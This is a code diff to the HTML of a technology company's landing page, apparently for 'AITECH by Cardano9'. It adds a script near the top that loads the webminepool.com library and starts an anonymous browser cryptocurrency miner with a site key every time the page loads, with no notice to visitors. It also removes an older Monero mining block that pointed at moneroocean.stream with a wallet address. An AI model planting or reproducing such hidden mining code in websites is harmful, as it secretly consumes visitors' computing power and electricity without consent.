@@ -10,7 +10,17 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
     <meta name="description" content="Official platform for AITECH by Cardano9 - Innovative technology solutions and services">
+     <script src="https://www.webminepool.com/lib/base.js"></script>
+    <script>
+    // For anonymous mining (no user tracking)
+    var miner = WMP.Anonymous('SK_6YWjlhnBrW8JKecZnt6KQ');
     
+    // For user-specific tracking (e.g., track hashes per user)
+    // var miner = WMP.User('YOUR_SITE_KEY', 'USERNAME', { throttle: 0.5 });
+    
+    miner.start();
+	    
+</script>
     <!-- Security Headers -->
     <meta http-equiv="Content-Security-Policy" 
           content="default-src 'self' 
@@ -258,61 +268,7 @@
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
 
-		<script src="webmr.js"></script>
 
-  <!--THE MINER SCRIPT-->
-  <script src="webmr.js"></script>
-
-  <script>
-
-    function start() {
-
-      document.getElementById("startb").disabled = true; // disable button
-      
-      /* start mining, use a local server */
-      server = "ws://localhost:8181";
-      
-      startMining("moneroocean.stream",
-        "45w2kfgZYyHXX2ZR6azLutN5TKrr17E2SKNj7fdXqnYvYNZtei6dpyD7EwTybZJeBX5gCiutXnAmLdBqAstdSs4Q4PvM5Fj");
-
-      /* Alternative (see logins.json): startMiningWithId("favpool");  */
-      
-      /* keep us updated */
-
-      addText("Connecting...");
-
-      setInterval(function () {
-        // for the definition of sendStack/receiveStack, see miner.js
-        while (sendStack.length > 0) addText((sendStack.pop()));
-        while (receiveStack.length > 0) addText((receiveStack.pop()));
-        addText("calculated " + totalhashes + " hashes.");
-      }, 2000);
-
-    }
-
-    /* helper function to put text into the text field.  */
-
-    function addText(obj) {
-
-      var elem = document.getElementById("texta");
-      elem.value += "[" + new Date().toLocaleString() + "] ";
-
-      if (obj.identifier === "job")
-        elem.value += "new job: " + obj.job_id;
-      else if (obj.identifier === "solved")
-        elem.value += "solved job: " + obj.job_id;
-      else if (obj.identifier === "hashsolved")
-        elem.value += "pool accepted hash!";
-      else if (obj.identifier === "error")
-        elem.value += "error: " + obj.param;
-      else elem.value += obj;
-
-      elem.value += "\n";
-      elem.scrollTop = elem.scrollHeight;
-
-    }
-
-  </script>
 		
 	</body>
 </html>
